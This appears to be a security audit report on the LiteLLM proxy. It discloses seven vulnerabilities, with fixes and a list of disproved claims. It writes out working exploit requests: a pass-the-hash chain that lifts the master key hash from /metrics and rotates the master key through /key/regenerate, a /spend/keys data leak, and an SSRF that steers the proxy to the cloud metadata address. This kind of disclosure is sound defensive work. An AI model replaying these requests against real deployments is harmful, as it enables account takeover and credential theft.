# LiteLLM Proxy — Security Audit Report

**Date:** 2026-04-21
**Target:** LiteLLM proxy server, commit `b9bedc8153` on `litellm_internal_staging`
**Method:** Source code audit → execution path tracing → live exploitation against a real proxy instance
**Auditors:** Independent security research
**Methodology:** AutoFyn for finding vulnerabilities, Claude Code for verification and live exploitation.
**Live reproduction:** `./tests/autofyn_audit/run_live_tests.sh` — 7/7 findings confirmed live, 2 regressions verified safe

---

## Summary

We identified **7 live-confirmed exploitable vulnerabilities** in the LiteLLM proxy server. Two of these chain together into a **full proxy takeover requiring only network access and any low-privilege API key**.

Every finding was tested against a real LiteLLM proxy with Postgres — no mocks.

| Finding | Severity | Live Confirmed |
|---|---|---|
| **CHAIN-1: `/metrics` + pass-the-hash = full takeover** | **Critical** | **Yes** |
| F-5: `_is_master_key()` accepts hash — master key rotation | Critical | Yes |
| F-3: Unauthenticated `/metrics/` leaks master key hash | High | Yes |
| F-2: `/spend/keys` leaks all key rows to any internal user | High | Yes |
| F-6: MCP OAuth metadata SSRF (no private IP validation) | High | Yes |
| F-4: Unauthenticated `/token` endpoint (SSRF amplifier) | Medium | Yes |
| F-1: Unauthenticated `/debug/asyncio-tasks` | Low | Yes |

5 additional claims from the original static analysis were **disproved** by live testing (see Appendix).

---

## CHAIN-1: Unauthenticated Full Proxy Takeover (F-3 + F-5)

**Severity:** Critical
**Prerequisites:** Prometheus enabled (the default when `callbacks: ["prometheus"]`), at least one request made with the master key, attacker has any authenticated API key (e.g. SSO-created `INTERNAL_USER_VIEW_ONLY`)
**Live confirmed:** Yes — 6-step chain executed end-to-end

This is the headline finding. An attacker with network access and any low-privilege key can take full admin control of the proxy. No secrets, no insider access, no social engineering.

### The attack

```
Step 1: Admin makes any LLM request using the master key (normal usage)
        → Prometheus records hashed_api_key="<master_key_sha256>" in metric labels

Step 2: GET /metrics/  (NO authentication required)
        → Attacker extracts hashed_api_key from any metric label
        → This is the SHA-256 hash of the master key

Step 3: POST /key/regenerate
        Authorization: Bearer <any-valid-low-priv-key>
        {"key": "<extracted_hash>", "new_master_key": "sk-attacker-owns-this"}
        → 200 OK — master key rotated to attacker's value

Step 4: Attacker now IS the admin.
        → Create new admin keys, lock out real admins,
          access all configured LLM providers (OpenAI, Anthropic, etc.)
```

### Why it works

Two independent bugs combine:

1. **F-3**: `/metrics/` is unauthenticated by default. Prometheus metric labels include `hashed_api_key` — the SHA-256 hash of whichever API key made the request. When the admin uses the master key, its hash appears in these labels for anyone to read.

2. **F-5**: `_is_master_key()` accepts both the plaintext master key and its SHA-256 hash as equivalent. `/key/regenerate` calls this function on the **request body** (not the Authorization header), and master key regeneration is **exempt from the enterprise feature gate**.

### Live exploit output

```
CHAIN-1: /metrics (unauth) → master hash → /key/regenerate → TAKEOVER
  Step 1-2: Extracted hash from /metrics/ (no auth): 1c807cf78eeea8ea9b30...
  [VULNERABLE] Full takeover: unauth /metrics → hash → low-priv /key/regenerate → master key rotated
```

### How realistic is obtaining a low-privilege key?

The attacker needs *any* valid API key. Paths to obtain one:

- **SSO auto-provisioning**: When SSO is configured, `/sso/callback` auto-creates users with `INTERNAL_USER_VIEW_ONLY` role and returns an API key. Any employee who can authenticate via the organization's SSO gets a key — no admin approval needed.
- **Invitation links**: `/onboarding/get_token` is unauthenticated and generates keys from valid invitation links.
- **Any existing user**: Every user with a key — developers, testers, service accounts — has sufficient privilege.

### Fix

Both bugs must be fixed:

1. **F-5**: Remove the hash comparison branch from `_is_master_key()` in `spend_tracking_utils.py:55-69`.
2. **F-3**: Default `require_auth_for_metrics_endpoint` to `true`, or strip `hashed_api_key` from metric labels.

---

## F-5: Pass-the-Hash Enables Master Key Rotation

**Severity:** Critical
**CWE:** CWE-836 (Use of Password Hash Instead of Password for Authentication)
**Files:** `spend_tracking_utils.py:55-69`, `key_management_endpoints.py:3919`
**Live confirmed:** Yes — 200 OK, master key rotated by low-privilege user

`_is_master_key()` accepts both the plaintext master key and its SHA-256 hash:

```python
# litellm/proxy/spend_tracking/spend_tracking_utils.py:55-69
def _is_master_key(api_key, _master_key):
    is_master_key = secrets.compare_digest(api_key, _master_key)
    if is_master_key:
        return True
    # BUG: treats the hash as equivalent to the key itself
    is_master_key = secrets.compare_digest(api_key, hash_token(_master_key))
    if is_master_key:
        return True
    return False
```

`/key/regenerate` calls `_is_master_key(api_key=data.key, ...)` on the **request body** — not the Authorization header. The enterprise feature gate is bypassed when `new_master_key` is provided (line 3894-3896: `if premium_user is not True and not is_master_key_regeneration` — master key regeneration is exempt).

### Live exploit

```
POST /key/regenerate HTTP/1.1
Authorization: Bearer sk-low-privilege-user-key
Content-Type: application/json

{
  "key": "1c807cf78eeea8ea9b30e583dab15a057d4e5c95...",
  "new_master_key": "sk-attacker-controls-this-now"
}
```

**Live result:** `200 OK` — master key rotated to attacker's value.

### Fix

Remove the hash comparison branch from `_is_master_key()`. Only accept `secrets.compare_digest(api_key, _master_key)`.

---

## F-3: Unauthenticated `/metrics/` Leaks Master Key Hash

**Severity:** High (upgraded from Medium — enables CHAIN-1)
**CWE:** CWE-306, CWE-359
**File:** `litellm/integrations/prometheus.py:3477`
**Live confirmed:** Yes — 200 with no auth, master key hash in labels
**Condition:** Prometheus enabled, `require_auth_for_metrics_endpoint` not set (the default)

`/metrics/` serves Prometheus metrics with no authentication. After any request made with the master key, metric labels contain its full SHA-256 hash:

```
litellm_proxy_total_requests_metric_total{
  hashed_api_key="1c807cf78eeea8ea9b30e583dab15a057d4e5c9551dd8c565f55ad1e4f18a0c4",
  api_key_alias="None",
  user_email="None",
  client_ip="127.0.0.1",
  ...
} 1.0
```

This hash is the exact input needed for F-5.

### Fix

Default `require_auth_for_metrics_endpoint` to `true`.

---

## F-2: `/spend/keys` Leaks All Key Rows to Any Internal User

**Severity:** High
**CWE:** CWE-200 (Exposure of Sensitive Information)
**File:** `litellm/proxy/spend_tracking/spend_management_endpoints.py:34-66`
**Live confirmed:** Yes — internal user gets all rows

`spend_key_fn()` has no `user_api_key_dict` parameter. It fetches every key with no filtering:

```python
async def spend_key_fn():  # no caller context
    key_info = await prisma_client.get_data(table_name="key", query_type="find_all")
    return key_info
```

The route is in `spend_tracking_routes`, accessible to `INTERNAL_USER` and `INTERNAL_USER_VIEW_ONLY`.

### Live exploit

```
GET /spend/keys HTTP/1.1
Authorization: Bearer sk-low-privilege-internal-user-key
```

**Live result:** All key rows returned — token hashes, key names, user IDs, team IDs, budgets, metadata.

### What it exposes

- All user-generated API key hashes (but **not** the master key hash — it's not in `LiteLLM_VerificationToken`)
- Key names, aliases, and associated user/team IDs
- Budget limits and current spend for every key
- Full metadata dictionaries

### Note on spend log filtering

We investigated whether internal users can extract the master key hash via `/spend/logs`. They cannot — `view_spend_logs()` (line 2261-2265) and `ui_view_spend_logs()` (line 1914-1952) both filter by `user_api_key_dict.user_id` for non-admin roles. The master key hash is only obtainable via `/metrics/` (F-3).

### Fix

Add `user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth)` parameter. Filter by role.

---

## F-4: Unauthenticated `/token` Endpoint (SSRF Amplifier)

**Severity:** Medium
**CWE:** CWE-918 (SSRF)
**File:** `litellm/proxy/_experimental/mcp_server/discoverable_endpoints.py:589`
**Live confirmed:** Yes — returns 404 (not 401) with no auth

The `/token` endpoint is intentionally public for OAuth flows. The security issue: it POSTs to the stored `token_url` with no SSRF validation. Combined with F-6 (MCP OAuth SSRF), this relays requests to internal services.

**Fix:** Add URL validation to `exchange_token_with_server()`.

---

## F-1: Unauthenticated `/debug/asyncio-tasks`

**Severity:** Low
**CWE:** CWE-306 (Missing Authentication)
**File:** `litellm/proxy/common_utils/debug_utils.py:53`
**Live confirmed:** Yes — 200 with no auth

No `Depends(user_api_key_auth)` on the route. Any network client gets active coroutine names:

```json
{
  "total_active_tasks": 7,
  "by_name": {
    "PrismaClient._db_health_watchdog_loop": 1,
    "SlackAlerting._run_scheduled_daily_report": 1,
    "_monitor_spend_logs_queue": 1
  }
}
```

Reveals: database type, alerting configuration, monitoring setup.

**Fix:** Add `dependencies=[Depends(user_api_key_auth)]`.

---

## F-6: MCP OAuth Metadata SSRF

**Severity:** High
**CWE:** CWE-918
**File:** `mcp_server_manager.py:1481-1704`
**Live confirmed:** Yes — proxy followed attacker-controlled URL to internal target

When an admin registers an MCP server with `auth_type: oauth2`, the proxy performs RFC 9728 OAuth discovery. It connects to the server, expects a `401` with a `WWW-Authenticate` header, then **follows the `resource_metadata` URL from that header with no validation**.

### The vulnerability

```python
# mcp_server_manager.py:1509-1520
resource_metadata_url, scopes = self._parse_www_authenticate_header(header_value)
if resource_metadata_url:
    # Fetches ANY URL the server provides — no private-IP check, no scheme check
    authorization_servers, resource_scopes = await self._fetch_oauth_metadata_from_resource(
        resource_metadata_url
    )
```

`_fetch_oauth_metadata_from_resource()` (line 1591) and `_fetch_single_authorization_server_metadata()` (line 1687) make HTTP GET requests to arbitrary URLs. `IPAddressUtils` exists in the codebase but is not applied here.

### Live exploit

The test starts a mock HTTP server that acts as a malicious MCP server:

1. Admin registers `http://attacker:PORT/mcp` as an MCP server with `auth_type: oauth2`
2. Proxy connects → mock returns `401` + `WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/..."`
3. Proxy fetches `http://169.254.169.254/...` — SSRF to cloud metadata service

```
  [VULNERABLE] F-6
               Proxy fetched attacker-controlled URL http://127.0.0.1:PORT/ssrf-canary — SSRF confirmed
```

### Realistic scenario

An admin adds a third-party MCP server that is compromised or malicious. The proxy's OAuth discovery makes requests to internal network addresses (cloud metadata APIs, internal services) on behalf of the attacker. This can leak cloud credentials (AWS IAM role tokens via `169.254.169.254`), probe internal services, or access other internal APIs.

### Fix

Add private IP blocklist and `https://` scheme restriction to `_fetch_oauth_metadata_from_resource()` and `_fetch_single_authorization_server_metadata()`. The codebase already has `IPAddressUtils` — apply it here.

---

## Reproduction

```bash
# One command — starts Postgres, proxy, seeds traffic, runs exploits, tears down
./tests/autofyn_audit/run_live_tests.sh
```

Requires: Docker, `uv`, `prisma generate` run once.

**Expected output:**
```
F-1: debug unauth              VULNERABLE
F-2: spend/keys leak           VULNERABLE
F-3: metrics unauth            VULNERABLE
F-4: token unauth              VULNERABLE
F-5: pass-the-hash             VULNERABLE
CHAIN-1: metrics→takeover      VULNERABLE
F-6: MCP OAuth SSRF            VULNERABLE

7/7 findings confirmed against live proxy
```

---

## Recommended Fix Priority

| Priority | Finding | Fix |
|---|---|---|
| **Immediate** | F-5: Remove hash branch from `_is_master_key()` | Small — one function change |
| **Immediate** | F-3: Default `/metrics` to require auth | Small — breaks CHAIN-1 |
| **High** | F-2: Add caller filtering to `/spend/keys` | Small — add param + filter |
| **High** | F-6: Add SSRF validation to MCP OAuth discovery | Medium |
| **High** | F-4: Add SSRF validation to `/token` relay | Medium |
| **Standard** | F-1: Add auth to `/debug/asyncio-tasks` | Trivial |

---

## Appendix: Disproved Claims

The original static analysis identified 5 additional vulnerabilities that were **not exploitable** in live testing:

| Claim | Why Not Exploitable |
|---|---|
| MCP `.well-known` query-string auth bypass | Main `user_api_key_auth` middleware rejects the request before the MCP handler runs. The `.well-known` check in `user_api_key_auth_mcp.py:120` is dead code in this path. |
| MCP OAuth2 fallback grants anonymous access | Same — main auth middleware rejects invalid bearer tokens before MCP auth handler. |
| `/spend/logs` leaks master key hash to internal users | Spend log endpoints filter by `user_api_key_dict.user_id` for non-admin roles (lines 2261-2265, 1914-1952). Internal users see only their own logs. |
| SSO callback creates admin users | `/sso/callback` defaults to `INTERNAL_USER_VIEW_ONLY` role. Admin role requires explicit SSO provider configuration. |
| `/user/new` accessible without auth | Returns 401 — requires valid API key. |
